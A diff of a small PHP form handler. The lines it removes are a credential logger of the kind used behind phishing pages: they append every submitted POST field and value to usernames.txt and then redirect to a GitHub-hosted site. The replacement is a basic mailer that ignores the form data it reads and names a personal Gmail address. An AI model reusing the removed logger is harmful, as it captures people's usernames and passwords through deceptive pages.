@@ -1,13 +1,13 @@
 <?php
-	header ('Location:http://firefoxcraft.github.io/');
-	$handle = fopen("usernames.txt", "a");
-	foreach($_POST as $variable => $value) {
-	fwrite($handle, $variable);
-	fwrite($handle, "=");
-	fwrite($handle, $value);
-	fwrite($handle, "\r\n");
-	}
-	fwrite($handle, "\r\n");
-	fclose($handle);
-	exit;
+$name = $_POST['name'];
+$email = $_POST['email'];
+$comment = $_POST['comment'];
+
+$to = "rhamgunnerm@gmail.com";
+$subject = "Request";
+$body = "Message from someone";
+
+mail($to, $subject, $body);
+
+echo "Message sent!<a href='http://rpxpizza.000webhostapp.com'>MAIN PAGE<a/>";
 	?> 
